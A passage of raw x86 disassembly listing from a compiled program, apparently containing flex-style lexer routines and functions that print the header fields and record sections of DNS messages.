  404b67:	mov    edi,DWORD PTR ds:0x411c18
  404b6d:	mov    ebx,DWORD PTR [ebp-0x4]
  404b70:	mov    esi,DWORD PTR ds:0x411bd8
  404b76:	mov    DWORD PTR [esi+0x10],edi
  404b79:	test   edi,edi
  404b7b:	jne    0x404b9f
  404b7d:	test   ebx,ebx
  404b7f:	jne    0x404b97
  404b81:	call   0x404d15
  404b86:	mov    esi,DWORD PTR ds:0x411bd8
  404b8c:	xor    eax,eax
  404b8e:	mov    edi,DWORD PTR ds:0x411c18
  404b94:	inc    eax
  404b95:	jmp    0x404ba1
  404b97:	push   0x2
  404b99:	pop    eax
  404b9a:	mov    DWORD PTR [esi+0x24],eax
  404b9d:	jmp    0x404ba1
  404b9f:	xor    eax,eax
  404ba1:	mov    ecx,DWORD PTR [esi+0x4]
  404ba4:	add    edi,ebx
  404ba6:	mov    DWORD PTR ds:0x411c18,edi
  404bac:	mov    BYTE PTR [edi+ecx*1],0x0
  404bb0:	mov    ecx,DWORD PTR [esi+0x4]
  404bb3:	mov    BYTE PTR [edi+ecx*1+0x1],0x0
  404bb8:	mov    ecx,DWORD PTR [esi+0x4]
  404bbb:	pop    edi
  404bbc:	mov    DWORD PTR ds:0x4128fc,ecx
  404bc2:	pop    ebx
  404bc3:	pop    esi
  404bc4:	mov    esp,ebp
  404bc6:	pop    ebp
  404bc7:	ret    
  404bc8:	mov    ecx,0x401140
  404bcd:	call   0x404e20
  404bd2:	int3   
  404bd3:	int3   
  404bd4:	int3   
  404bd5:	int3   
  404bd6:	int3   
  404bd7:	int3   
  404bd8:	mov    eax,ds:0x411bd8
  404bdd:	mov    edx,DWORD PTR ds:0x4128fc
  404be3:	mov    ecx,DWORD PTR [eax+0x1c]
  404be6:	add    ecx,DWORD PTR ds:0x411be0
  404bec:	cmp    edx,DWORD PTR ds:0x411bd4
  404bf2:	jae    0x404c7c
  404bf8:	push   ebx
  404bf9:	push   esi
  404bfa:	push   edi
  404bfb:	mov    al,BYTE PTR [edx]
  404bfd:	test   al,al
  404bff:	je     0x404c0d
  404c01:	movzx  eax,al
  404c04:	mov    bl,BYTE PTR [eax*4+0x4021c0]
  404c0b:	jmp    0x404c0f
  404c0d:	mov    bl,0x1
  404c0f:	lea    esi,[ecx+ecx*1]
  404c12:	cmp    WORD PTR [esi+0x401210],0x0
  404c1a:	je     0x404c43
  404c1c:	mov    DWORD PTR ds:0x411c10,ecx
  404c22:	mov    DWORD PTR ds:0x411c1c,edx
  404c28:	jmp    0x404c43
  404c2a:	movsx  ecx,WORD PTR [esi+0x402010]
  404c31:	cmp    ecx,0xb2
  404c37:	jl     0x404c40
  404c39:	mov    bl,BYTE PTR [edi*4+0x401380]
  404c40:	lea    esi,[ecx+ecx*1]
  404c43:	movsx  eax,WORD PTR [esi+0x401930]
  404c4a:	movzx  edi,bl
  404c4d:	add    eax,edi
  404c4f:	movsx  eax,WORD PTR [eax*2+0x401ae0]
  404c57:	cmp    eax,ecx
  404c59:	jne    0x404c2a
  404c5b:	movsx  ecx,WORD PTR [ecx*2+0x401930]
  404c63:	movzx  eax,bl
  404c66:	add    ecx,eax
  404c68:	inc    edx
  404c69:	movsx  ecx,WORD PTR [ecx*2+0x401400]
  404c71:	cmp    edx,DWORD PTR ds:0x411bd4
  404c77:	jb     0x404bfb
  404c79:	pop    edi
  404c7a:	pop    esi
  404c7b:	pop    ebx
  404c7c:	mov    eax,ecx
  404c7e:	ret    
  404c7f:	int3   
  404c80:	int3   
  404c81:	int3   
  404c82:	int3   
  404c83:	int3   
  404c84:	mov    edx,ecx
  404c86:	push   ebx
  404c87:	push   esi
  404c88:	mov    bl,0x1
  404c8a:	lea    esi,[edx+edx*1]
  404c8d:	cmp    WORD PTR [esi+0x401210],0x0
  404c95:	je     0x404ca7
  404c97:	mov    eax,ds:0x411bd4
  404c9c:	mov    DWORD PTR ds:0x411c10,edx
  404ca2:	mov    ds:0x411c1c,eax
  404ca7:	movsx  eax,WORD PTR [esi+0x401930]
  404cae:	movsx  eax,WORD PTR [eax*2+0x401ae2]
  404cb6:	jmp    0x404ce8
  404cb8:	movsx  edx,WORD PTR [esi+0x402010]
  404cbf:	cmp    edx,0xb2
  404cc5:	jl     0x404cd1
  404cc7:	movzx  eax,bl
  404cca:	mov    bl,BYTE PTR [eax*4+0x401380]
  404cd1:	lea    esi,[edx+edx*1]
  404cd4:	movzx  eax,bl
  404cd7:	movsx  ecx,WORD PTR [esi+0x401930]
  404cde:	add    ecx,eax
  404ce0:	movsx  eax,WORD PTR [ecx*2+0x401ae0]
  404ce8:	cmp    eax,edx
  404cea:	jne    0x404cb8
  404cec:	movsx  ecx,WORD PTR [edx*2+0x401930]
  404cf4:	movzx  eax,bl
  404cf7:	add    ecx,eax
  404cf9:	pop    esi
  404cfa:	pop    ebx
  404cfb:	movsx  ecx,WORD PTR [ecx*2+0x401400]
  404d03:	lea    eax,[ecx-0xb1]
  404d09:	neg    eax
  404d0b:	sbb    eax,eax
  404d0d:	and    eax,ecx
  404d0f:	ret    
  404d10:	int3   
  404d11:	int3   
  404d12:	int3   
  404d13:	int3   
  404d14:	int3   
  404d15:	mov    edi,edi
  404d17:	push   ebp
  404d18:	mov    ebp,esp
  404d1a:	push   ecx
  404d1b:	mov    eax,ds:0x411bd8
  404d20:	push   esi
  404d21:	mov    esi,DWORD PTR ds:0x411be4
  404d27:	test   eax,eax
  404d29:	jne    0x404d3a
  404d2b:	mov    ecx,0x4000
  404d30:	call   0x404d83
  404d35:	mov    ds:0x411bd8,eax
  404d3a:	mov    edx,esi
  404d3c:	mov    ecx,eax
  404d3e:	call   0x404dd6
  404d43:	call   0x404d52
  404d48:	pop    esi
  404d49:	mov    esp,ebp
  404d4b:	pop    ebp
  404d4c:	ret    
  404d4d:	int3   
  404d4e:	int3   
  404d4f:	int3   
  404d50:	int3   
  404d51:	int3   
  404d52:	mov    edx,DWORD PTR ds:0x411bd8
  404d58:	mov    ecx,DWORD PTR [edx+0x8]
  404d5b:	mov    eax,DWORD PTR [edx+0x10]
  404d5e:	mov    ds:0x411c18,eax
  404d63:	mov    eax,DWORD PTR [edx]
  404d65:	mov    ds:0x411be4,eax
  404d6a:	mov    al,BYTE PTR [ecx]
  404d6c:	mov    DWORD PTR ds:0x411bd4,ecx
  404d72:	mov    DWORD PTR ds:0x4128fc,ecx
  404d78:	mov    ds:0x411c20,al
  404d7d:	ret    
  404d7e:	int3   
  404d7f:	int3   
  404d80:	int3   
  404d81:	int3   
  404d82:	int3   
  404d83:	mov    edi,edi
  404d85:	push   esi
  404d86:	push   edi
  404d87:	push   0x28
  404d89:	mov    edi,ecx
  404d8b:	call   DWORD PTR ds:0x4131a4
  404d91:	mov    esi,eax
  404d93:	pop    ecx
  404d94:	test   esi,esi
  404d96:	je     0x404dc6
  404d98:	lea    eax,[edi+0x2]
  404d9b:	mov    DWORD PTR [esi+0xc],edi
  404d9e:	push   eax
  404d9f:	call   DWORD PTR ds:0x4131a4
  404da5:	mov    DWORD PTR [esi+0x4],eax
  404da8:	pop    ecx
  404da9:	test   eax,eax
  404dab:	je     0x404dc6
  404dad:	mov    edx,DWORD PTR ds:0x411be4
  404db3:	mov    ecx,esi
  404db5:	mov    DWORD PTR [esi+0x14],0x1
  404dbc:	call   0x404dd6
  404dc1:	pop    edi
  404dc2:	mov    eax,esi
  404dc4:	pop    esi
  404dc5:	ret    
  404dc6:	mov    ecx,0x4011d8
  404dcb:	call   0x404e20
  404dd0:	int3   
  404dd1:	int3   
  404dd2:	int3   
  404dd3:	int3   
  404dd4:	int3   
  404dd5:	int3   
  404dd6:	mov    edi,edi
  404dd8:	push   ebx
  404dd9:	push   esi
  404dda:	xor    ebx,ebx
  404ddc:	mov    esi,ecx
  404dde:	inc    ebx
  404ddf:	push   edi
  404de0:	mov    edi,edx
  404de2:	test   esi,esi
  404de4:	je     0x404e0f
  404de6:	mov    eax,DWORD PTR [esi+0x4]
  404de9:	xor    ecx,ecx
  404deb:	mov    DWORD PTR [esi+0x10],ecx
  404dee:	mov    BYTE PTR [eax],cl
  404df0:	mov    eax,DWORD PTR [esi+0x4]
  404df3:	mov    BYTE PTR [eax+0x1],cl
  404df6:	mov    eax,DWORD PTR [esi+0x4]
  404df9:	mov    DWORD PTR [esi+0x8],eax
  404dfc:	mov    DWORD PTR [esi+0x1c],ebx
  404dff:	mov    DWORD PTR [esi+0x24],ecx
  404e02:	cmp    esi,DWORD PTR ds:0x411bd8
  404e08:	jne    0x404e0f
  404e0a:	call   0x404d52
  404e0f:	mov    DWORD PTR [esi],edi
  404e11:	pop    edi
  404e12:	mov    DWORD PTR [esi+0x20],ebx
  404e15:	mov    DWORD PTR [esi+0x18],ebx
  404e18:	pop    esi
  404e19:	pop    ebx
  404e1a:	ret    
  404e1b:	int3   
  404e1c:	int3   
  404e1d:	int3   
  404e1e:	int3   
  404e1f:	int3   
  404e20:	mov    edi,edi
  404e22:	push   ecx
  404e23:	push   0x401204
  404e28:	push   0x2
  404e2a:	call   0x40d391
  404e2f:	pop    ecx
  404e30:	push   eax
  404e31:	call   DWORD PTR ds:0x413190
  404e37:	add    esp,0xc
  404e3a:	push   0x2
  404e3c:	call   DWORD PTR ds:0x413154
  404e42:	int3   
  404e43:	int3   
  404e44:	int3   
  404e45:	int3   
  404e46:	int3   
  404e47:	int3   
  404e48:	int3   
  404e49:	int3   
  404e4a:	int3   
  404e4b:	mov    edi,edi
  404e4d:	push   ebp
  404e4e:	mov    ebp,esp
  404e50:	sub    esp,0xc
  404e53:	push   ebx
  404e54:	push   esi
  404e55:	push   edi
  404e56:	mov    edi,DWORD PTR [ebp+0xc]
  404e59:	mov    ebx,ecx
  404e5b:	push   0x4025c0
  404e60:	push   edi
  404e61:	mov    DWORD PTR [ebp-0x8],edx
  404e64:	lea    esi,[ebx+0xc]
  404e67:	call   DWORD PTR ds:0x413190
  404e6d:	movzx  eax,BYTE PTR [ebx+0x2]
  404e71:	shr    eax,0x3
  404e74:	and    eax,0xf
  404e77:	push   DWORD PTR [eax*4+0x403438]
  404e7e:	push   0x4025d0
  404e83:	push   edi
  404e84:	call   DWORD PTR ds:0x413190
  404e8a:	movzx  eax,WORD PTR [ebx]
  404e8d:	add    esp,0x14
  404e90:	push   eax
  404e91:	call   DWORD PTR ds:0x413030
  404e97:	movzx  eax,ax
  404e9a:	push   eax
  404e9b:	push   0x4025e0
  404ea0:	push   edi
  404ea1:	call   DWORD PTR ds:0x413190
  404ea7:	movzx  eax,BYTE PTR [ebx+0x3]
  404eab:	add    esp,0xc
  404eae:	and    eax,0xf
  404eb1:	push   DWORD PTR [eax*4+0x403478]
  404eb8:	push   0x4025ec
  404ebd:	push   edi
  404ebe:	call   DWORD PTR ds:0x413190
  404ec4:	add    esp,0xc
  404ec7:	push   0x4025fc
  404ecc:	push   edi
  404ecd:	call   DWORD PTR ds:0x413190
  404ed3:	test   BYTE PTR [ebx+0x2],0x80
  404ed7:	pop    ecx
  404ed8:	pop    ecx
  404ed9:	je     0x404ee2
  404edb:	push   0x40260c
  404ee0:	jmp    0x404ee7
  404ee2:	push   0x402618
  404ee7:	push   edi
  404ee8:	call   DWORD PTR ds:0x413190
  404eee:	test   BYTE PTR [ebx+0x2],0x4
  404ef2:	pop    ecx
  404ef3:	pop    ecx
  404ef4:	je     0x404f04
  404ef6:	push   0x402620
  404efb:	push   edi
  404efc:	call   DWORD PTR ds:0x413190
  404f02:	pop    ecx
  404f03:	pop    ecx
  404f04:	test   BYTE PTR [ebx+0x2],0x2
  404f08:	je     0x404f18
  404f0a:	push   0x402630
  404f0f:	push   edi
  404f10:	call   DWORD PTR ds:0x413190
  404f16:	pop    ecx
  404f17:	pop    ecx
  404f18:	test   BYTE PTR [ebx+0x2],0x1
  404f1c:	je     0x404f2c
  404f1e:	push   0x402640
  404f23:	push   edi
  404f24:	call   DWORD PTR ds:0x413190
  404f2a:	pop    ecx
  404f2b:	pop    ecx
  404f2c:	test   BYTE PTR [ebx+0x3],0x80
  404f30:	je     0x404f40
  404f32:	push   0x402654
  404f37:	push   edi
  404f38:	call   DWORD PTR ds:0x413190
  404f3e:	pop    ecx
  404f3f:	pop    ecx
  404f40:	test   BYTE PTR [ebx+0x3],0x40
  404f44:	je     0x404f54
  404f46:	push   0x402668
  404f4b:	push   edi
  404f4c:	call   DWORD PTR ds:0x413190
  404f52:	pop    ecx
  404f53:	pop    ecx
  404f54:	movzx  eax,WORD PTR [ebx+0x4]
  404f58:	push   eax
  404f59:	call   DWORD PTR ds:0x413030
  404f5f:	movzx  eax,ax
  404f62:	push   eax
  404f63:	push   0x402674
  404f68:	push   edi
  404f69:	call   DWORD PTR ds:0x413190
  404f6f:	movzx  eax,WORD PTR [ebx+0x6]
  404f73:	add    esp,0xc
  404f76:	push   eax
  404f77:	call   DWORD PTR ds:0x413030
  404f7d:	movzx  eax,ax
  404f80:	push   eax
  404f81:	push   0x402688
  404f86:	push   edi
  404f87:	call   DWORD PTR ds:0x413190
  404f8d:	movzx  eax,WORD PTR [ebx+0x8]
  404f91:	add    esp,0xc
  404f94:	push   eax
  404f95:	call   DWORD PTR ds:0x413030
  404f9b:	movzx  eax,ax
  404f9e:	push   eax
  404f9f:	push   0x402698
  404fa4:	push   edi
  404fa5:	call   DWORD PTR ds:0x413190
  404fab:	movzx  eax,WORD PTR [ebx+0xa]
  404faf:	add    esp,0xc
  404fb2:	push   eax
  404fb3:	call   DWORD PTR ds:0x413030
  404fb9:	movzx  eax,ax
  404fbc:	push   eax
  404fbd:	push   0x4026b4
  404fc2:	push   edi
  404fc3:	call   DWORD PTR ds:0x413190
  404fc9:	movzx  eax,WORD PTR [ebx+0x4]
  404fcd:	add    esp,0xc
  404fd0:	push   eax
  404fd1:	call   DWORD PTR ds:0x413030
  404fd7:	movzx  eax,ax
  404fda:	mov    DWORD PTR [ebp-0x4],eax
  404fdd:	test   eax,eax
  404fdf:	je     0x405088
  404fe5:	push   0x4026cc
  404fea:	push   edi
  404feb:	call   DWORD PTR ds:0x413190
  404ff1:	pop    ecx
  404ff2:	pop    ecx
  404ff3:	jmp    0x40507e
  404ff8:	push   0x4026dc
  404ffd:	push   edi
  404ffe:	call   DWORD PTR ds:0x413190
  405004:	pop    ecx
  405005:	pop    ecx
  405006:	push   0x0
  405008:	push   edi
  405009:	push   DWORD PTR [ebp-0x8]
  40500c:	mov    edx,ebx
  40500e:	mov    ecx,esi
  405010:	call   0x40518c
  405015:	mov    esi,eax
  405017:	test   esi,esi
  405019:	je     0x40517e
  40501f:	movzx  ecx,BYTE PTR [esi]
  405022:	movzx  eax,BYTE PTR [esi+0x1]
  405026:	add    esi,0x2
  405029:	shl    cx,0x8
  40502d:	or     cx,ax
  405030:	mov    DWORD PTR [ebp-0xc],esi
  405033:	add    DWORD PTR [ebp-0xc],0x2
  405037:	movzx  eax,BYTE PTR [esi+0x1]
  40503b:	movzx  edx,cx
  40503e:	movzx  ecx,BYTE PTR [esi]
  405041:	shl    cx,0x8
  405045:	or     cx,ax
  405048:	movzx  esi,cx
  40504b:	movsx  ecx,dx
  40504e:	call   0x40b8af
  405053:	push   eax
  405054:	push   0x4026e0
  405059:	push   edi
  40505a:	call   DWORD PTR ds:0x413190
  405060:	add    esp,0xc
  405063:	movsx  ecx,si
  405066:	call   0x40a1a5
  40506b:	push   eax
  40506c:	push   0x4026ec
  405071:	push   edi
  405072:	call   DWORD PTR ds:0x413190
  405078:	mov    esi,DWORD PTR [ebp-0xc]
  40507b:	add    esp,0xc
  40507e:	sub    DWORD PTR [ebp-0x4],0x1
  405082:	jns    0x404ff8
  405088:	movzx  eax,WORD PTR [ebx+0x6]
  40508c:	push   eax
  40508d:	call   DWORD PTR ds:0x413030
  405093:	movzx  eax,ax
  405096:	mov    DWORD PTR [ebp-0x4],eax
  405099:	test   eax,eax
  40509b:	je     0x4050d8
  40509d:	push   0x4026fc
  4050a2:	push   edi
  4050a3:	call   DWORD PTR ds:0x413190
  4050a9:	pop    ecx
  4050aa:	pop    ecx
  4050ab:	jmp    0x4050d2
  4050ad:	push   0x40270c
  4050b2:	push   edi
  4050b3:	call   DWORD PTR ds:0x413190
  4050b9:	pop    ecx
  4050ba:	pop    ecx
  4050bb:	push   edi
  4050bc:	push   DWORD PTR [ebp-0x8]
  4050bf:	mov    edx,ebx
  4050c1:	mov    ecx,esi
  4050c3:	call   0x40524d
  4050c8:	mov    esi,eax
  4050ca:	test   esi,esi
  4050cc:	je     0x40517e
  4050d2:	sub    DWORD PTR [ebp-0x4],0x1
  4050d6:	jns    0x4050ad
  4050d8:	movzx  eax,WORD PTR [ebx+0x8]
  4050dc:	push   eax
  4050dd:	call   DWORD PTR ds:0x413030
  4050e3:	movzx  eax,ax
  4050e6:	mov    DWORD PTR [ebp-0x4],eax
  4050e9:	test   eax,eax
  4050eb:	je     0x405124
  4050ed:	push   0x402718
  4050f2:	push   edi
  4050f3:	call   DWORD PTR ds:0x413190
  4050f9:	pop    ecx
  4050fa:	pop    ecx
  4050fb:	jmp    0x40511e
  4050fd:	push   0x40270c
  405102:	push   edi
  405103:	call   DWORD PTR ds:0x413190
  405109:	pop    ecx
  40510a:	pop    ecx
  40510b:	push   edi
  40510c:	push   DWORD PTR [ebp-0x8]
  40510f:	mov    edx,ebx
  405111:	mov    ecx,esi
  405113:	call   0x40524d
  405118:	mov    esi,eax
  40511a:	test   esi,esi
  40511c:	je     0x40517e
  40511e:	sub    DWORD PTR [ebp-0x4],0x1
  405122:	jns    0x4050fd
  405124:	movzx  eax,WORD PTR [ebx+0xa]
  405128:	push   eax
  405129:	call   DWORD PTR ds:0x413030
  40512f:	movzx  eax,ax
  405132:	mov    DWORD PTR [ebp-0x4],eax
  405135:	test   eax,eax
  405137:	je     0x405170
  405139:	push   0x402730
  40513e:	push   edi
  40513f:	call   DWORD PTR ds:0x413190
  405145:	pop    ecx
  405146:	pop    ecx
  405147:	jmp    0x40516a
  405149:	push   0x40270c
  40514e:	push   edi
  40514f:	call   DWORD PTR ds:0x413190
  405155:	pop    ecx
  405156:	pop    ecx
  405157:	push   edi
  405158:	push   DWORD PTR [ebp-0x8]
  40515b:	mov    edx,ebx
  40515d:	mov    ecx,esi
  40515f:	call   0x40524d
  405164:	mov    esi,eax
  405166:	test   esi,esi
  405168:	je     0x40517e
  40516a:	sub    DWORD PTR [ebp-0x4],0x1
  40516e:	jns    0x405149
  405170:	push   0x40274c
  405175:	push   edi
  405176:	call   DWORD PTR ds:0x413190
  40517c:	pop    ecx
  40517d:	pop    ecx
  40517e:	pop    edi
  40517f:	pop    esi
  405180:	pop    ebx
  405181:	mov    esp,ebp
  405183:	pop    ebp
  405184:	ret    0x8
  405187:	int3   
  405188:	int3   
  405189:	int3   
  40518a:	int3   
  40518b:	int3   
  40518c:	mov    edi,edi
  40518e:	push   ebp
  40518f:	mov    ebp,esp
  405191:	sub    esp,0x108
  405197:	mov    eax,ds:0x40e004
  40519c:	xor    eax,ebp
  40519e:	mov    DWORD PTR [ebp-0x4],eax
  4051a1:	push   ebx
  4051a2:	push   esi
  4051a3:	push   edi
  4051a4:	mov    edi,DWORD PTR [ebp+0xc]
  4051a7:	lea    eax,[ebp-0x104]
  4051ad:	push   0x100
  4051b2:	mov    ebx,edx
  4051b4:	mov    esi,ecx
  4051b6:	mov    edx,DWORD PTR [ebp+0x8]
  4051b9:	mov    ecx,ebx
  4051bb:	push   eax
  4051bc:	push   esi
  4051bd:	call   0x409e47
  4051c2:	mov    DWORD PTR [ebp-0x108],eax
  4051c8:	test   eax,eax
  4051ca:	jns    0x4051e2
  4051cc:	sub    esi,ebx
  4051ce:	push   esi
  4051cf:	push   0x40275c
  4051d4:	push   edi
  4051d5:	call   DWORD PTR ds:0x413190
  4051db:	add    esp,0xc
  4051de:	xor    eax,eax
  4051e0:	jmp    0x405235
  4051e2:	cmp    BYTE PTR [ebp-0x104],0x0
  4051e9:	jne    0x405205
  4051eb:	push   0x40277c
  4051f0:	lea    eax,[ebp-0x104]
  4051f6:	push   0x100
  4051fb:	push   eax
  4051fc:	call   DWORD PTR ds:0x413130
  405202:	add    esp,0xc
  405205:	cmp    DWORD PTR [ebp+0x10],0x0
  405209:	lea    eax,[ebp-0x104]
  40520f:	je     0x405223
  405211:	push   eax
  405212:	push   0x402784
  405217:	push   edi
  405218:	call   DWORD PTR ds:0x413190
  40521e:	add    esp,0xc
  405221:	jmp    0x40522d
  405223:	push   edi
  405224:	push   eax
  405225:	call   DWORD PTR ds:0x41313c
  40522b:	pop    ecx
  40522c:	pop    ecx
  40522d:	mov    eax,DWORD PTR [ebp-0x108]
  405233:	add    eax,esi
  405235:	mov    ecx,DWORD PTR [ebp-0x4]
  405238:	pop    edi
  405239:	pop    esi
  40523a:	xor    ecx,ebp
  40523c:	pop    ebx
  40523d:	call   0x40cd10
  405242:	mov    esp,ebp
  405244:	pop    ebp
  405245:	ret    0xc
  405248:	int3   
  405249:	int3   
  40524a:	int3   
  40524b:	int3   
  40524c:	int3   
  40524d:	mov    edi,edi
  40524f:	push   ebx
  405250:	mov    ebx,esp
  405252:	push   ecx
  405253:	push   ecx
  405254:	and    esp,0xfffffff8
  405257:	add    esp,0x4
  40525a:	push   ebp
  40525b:	mov    ebp,DWORD PTR [ebx+0x4]
  40525e:	mov    DWORD PTR [esp+0x4],ebp
  405262:	mov    ebp,esp
  405264:	sub    esp,0x9b0
  40526a:	mov    eax,ds:0x40e004
  40526f:	xor    eax,ebp
  405271:	mov    DWORD PTR [ebp-0x4],eax
  405274:	mov    eax,DWORD PTR [ebx+0x8]
  405277:	push   esi
  405278:	push   edi
  405279:	mov    edi,DWORD PTR [ebx+0xc]
  40527c:	mov    esi,ecx
  40527e:	push   0x7ff
  405283:	mov    DWORD PTR [ebp-0x98c],eax
  405289:	lea    eax,[ebp-0x95f]
  40528f:	push   0x0
  405291:	push   eax
  405292:	mov    DWORD PTR [ebp-0x980],edx
  405298:	mov    DWORD PTR [ebp-0x974],edi
  40529e:	mov    BYTE PTR [ebp-0x960],0x0
  4052a5:	call   0x40d4a8
  4052aa:	mov    edx,DWORD PTR [ebp-0x980]
  4052b0:	add    esp,0xc
  4052b3:	mov    ecx,esi
  4052b5:	push   0x0
  4052b7:	push   edi
  4052b8:	push   DWORD PTR [ebp-0x98c]
  4052be:	call   0x40518c
  4052c3:	mov    edi,eax
  4052c5:	test   edi,edi
  4052c7:	jne    0x4052e3
  4052c9:	push   0x40278c
  4052ce:	push   DWORD PTR [ebp-0x974]
  4052d4:	call   DWORD PTR ds:0x413190
  4052da:	pop    ecx
  4052db:	pop    ecx
  4052dc:	xor    eax,eax
  4052de:	jmp    0x4060b4
  4052e3:	movzx  eax,BYTE PTR [edi]
  4052e6:	shl    ax,0x8
  4052ea:	movzx  esi,ax
  4052ed:	movzx  eax,BYTE PTR [edi+0x1]
  4052f1:	or     esi,eax
  4052f3:	movzx  eax,BYTE PTR [edi+0x2]
  4052f7:	shl    ax,0x8
  4052fb:	movzx  ecx,ax
  4052fe:	movzx  eax,BYTE PTR [edi+0x3]
  405302:	or     ecx,eax
  405304:	mov    DWORD PTR [ebp-0x9a8],esi
  40530a:	mov    DWORD PTR [ebp-0x978],ecx
  405310:	lea    ecx,[edi+0x4]
  405313:	call   0x40a17b
  405318:	movzx  ecx,BYTE PTR [edi+0x8]
  40531c:	shl    cx,0x8
  405320:	movzx  edx,cx
  405323:	movzx  ecx,BYTE PTR [edi+0x9]
  405327:	add    edi,0xa
  40532a:	or     edx,ecx
  40532c:	mov    DWORD PTR [ebp-0x9a4],eax
  405332:	mov    ecx,DWORD PTR ds:0x40e128
  405338:	mov    eax,ecx
  40533a:	and    eax,0x80000002
  40533f:	mov    DWORD PTR [ebp-0x994],edx
  405345:	mov    DWORD PTR [ebp-0x990],edi
  40534b:	mov    DWORD PTR [ebp-0x97c],eax
  405351:	je     0x4053c6
  405353:	test   ecx,ecx
  405355:	jns    0x405383
  405357:	mov    ecx,DWORD PTR [ebp-0x978]
  40535d:	push   edx
  40535e:	call   0x40a1a5
  405363:	push   eax
  405364:	mov    ecx,esi
  405366:	call   0x40b8af
  40536b:	mov    esi,DWORD PTR [ebp-0x974]
  405371:	push   eax
  405372:	push   0x4027a0
  405377:	push   esi
  405378:	call   DWORD PTR ds:0x413190
  40537e:	add    esp,0x14
  405381:	jmp    0x405389
  405383:	mov    esi,DWORD PTR [ebp-0x974]
  405389:	cmp    DWORD PTR [ebp-0x9a8],0x6
  405390:	jne    0x4053b3
  405392:	mov    ecx,DWORD PTR [ebp-0x9a4]
  405398:	call   0x40a1f7
  40539d:	push   eax
  40539e:	push   DWORD PTR [ebp-0x9a4]
  4053a4:	push   0x4027c4
  4053a9:	push   esi
  4053aa:	call   DWORD PTR ds:0x413190
  4053b0:	add    esp,0x10
  4053b3:	push   esi
  4053b4:	push   0xa
  4053b6:	call   DWORD PTR ds:0x41314c
  4053bc:	mov    edx,DWORD PTR [ebp-0x994]
  4053c2:	pop    ecx
  4053c3:	pop    ecx
  4053c4:	jmp    0x4053cc
  4053c6:	mov    esi,DWORD PTR [ebp-0x974]
  4053cc:	mov    ecx,DWORD PTR [ebp-0x9a8]
  4053d2:	lea    eax,[edi+edx*1]
  4053d5:	mov    DWORD PTR [ebp-0x9ac],edi
  4053db:	mov    DWORD PTR [ebp-0x988],eax
  4053e1:	cmp    ecx,0x27
  4053e4:	jg     0x405e60
  4053ea:	je     0x405e24
  4053f0:	lea    esi,[ecx-0x1]
  4053f3:	cmp    esi,0x20
  4053f6:	mov    esi,DWORD PTR [ebp-0x974]
  4053fc:	ja     0x40602b
  405402:	lea    edx,[ecx-0x1]
  405405:	jmp    DWORD PTR [edx*4+0x4060c9]
  40540c:	mov    ecx,DWORD PTR [ebp-0x978]
  405412:	mov    eax,ecx
  405414:	mov    edx,DWORD PTR [ebp-0x994]
  40541a:	sub    eax,0x1
  40541d:	je     0x40543a
  40541f:	sub    eax,0x3
  405422:	je     0x40543a
  405424:	push   edx
  405425:	push   ecx
  405426:	push   0x402828
  40542b:	push   esi
  40542c:	call   DWORD PTR ds:0x413190
  405432:	add    esp,0x10
  405435:	jmp    0x406053
  40543a:	cmp    edx,0x4
  40543d:	jne    0x40545f
  40543f:	push   DWORD PTR [edi]
  405441:	call   DWORD PTR ds:0x413018
  405447:	push   eax
  405448:	push   0x4027d8
  40544d:	push   esi
  40544e:	call   DWORD PTR ds:0x413190
  405454:	add    esp,0xc
  405457:	add    edi,0x4
  40545a:	jmp    0x406059
  40545f:	cmp    edx,0x7
  405462:	jne    0x406059
  405468:	push   DWORD PTR [edi]
  40546a:	call   DWORD PTR ds:0x413018
  405470:	push   eax
  405471:	push   0x4027f0
  405476:	push   esi
  405477:	call   DWORD PTR ds:0x413190
  40547d:	movsx  eax,BYTE PTR [edi+0x4]
  405481:	add    esp,0xc
  405484:	push   eax
  405485:	push   0x402808
  40548a:	push   esi
  40548b:	call   DWORD PTR ds:0x413190
  405491:	movsx  ecx,BYTE PTR [edi+0x5]
  405495:	add    esp,0xc
  405498:	movsx  eax,BYTE PTR [edi+0x6]
  40549c:	shl    ecx,0x8
  40549f:	add    ecx,eax
  4054a1:	push   ecx
  4054a2:	push   0x402818
  4054a7:	push   esi
  4054a8:	call   DWORD PTR ds:0x413190
  4054ae:	add    esp,0xc
  4054b1:	add    edi,0x7
  4054b4:	jmp    0x406059
  4054b9:	push   0x402848
  4054be:	jmp    0x405e29
  4054c3:	movzx  eax,BYTE PTR [edi]
  4054c6:	shl    ax,0x8
  4054ca:	movzx  ecx,ax
  4054cd:	movzx  eax,BYTE PTR [edi+0x1]
  4054d1:	or     ecx,eax
  4054d3:	push   ecx
  4054d4:	push   0x402874
  4054d9:	push   esi
  4054da:	call   DWORD PTR ds:0x413190
  4054e0:	add    esp,0xc
  4054e3:	add    edi,0x2
  4054e6:	push   0x402888
  4054eb:	jmp    0x405e29
  4054f0:	push   0x40289c
  4054f5:	jmp    0x405e29
  4054fa:	push   0x4028b4
  4054ff:	jmp    0x405e29
  405504:	push   0x4028c4
  405509:	jmp    0x405e29
  40550e:	movzx  eax,BYTE PTR [edi]
  405511:	shl    ax,0x8
  405515:	movzx  ecx,ax
  405518:	movzx  eax,BYTE PTR [edi+0x1]
  40551c:	or     ecx,eax
  40551e:	push   ecx
  40551f:	push   0x4028d8
  405524:	push   esi
  405525:	call   DWORD PTR ds:0x413190
  40552b:	add    esp,0xc
  40552e:	add    edi,0x2
  405531:	push   0x4028ec
  405536:	jmp    0x405e29
  40553b:	push   0x402900
  405540:	jmp    0x405e29
  405545:	push   0x402910
  40554a:	jmp    0x405e29
  40554f:	movsx  eax,BYTE PTR [edi]
  405552:	inc    edi
  405553:	mov    DWORD PTR [ebp-0x978],eax
  405559:	test   eax,eax
  40555b:	je     0x405574
  40555d:	push   edi
  40555e:	push   eax
  40555f:	push   0x40291c
  405564:	push   esi
  405565:	call   DWORD PTR ds:0x413190
  40556b:	add    esp,0x10
  40556e:	add    edi,DWORD PTR [ebp-0x978]
  405574:	movsx  eax,BYTE PTR [edi]
  405577:	inc    edi
  405578:	mov    DWORD PTR [ebp-0x978],eax
  40557e:	test   eax,eax
  405580:	je     0x406059
  405586:	push   edi
  405587:	push   eax
  405588:	push   0x402930
  40558d:	push   esi
  40558e:	call   DWORD PTR ds:0x413190
  405594:	add    esp,0x10
  405597:	add    edi,DWORD PTR [ebp-0x978]
  40559d:	jmp    0x406059
  4055a2:	cmp    DWORD PTR [ebp-0x97c],0x0
  4055a9:	jne    0x4055b6
  4055ab:	push   esi
  4055ac:	push   0xa
  4055ae:	call   DWORD PTR ds:0x41314c
  4055b4:	pop    ecx
  4055b5:	pop    ecx
  4055b6:	push   0x40293c
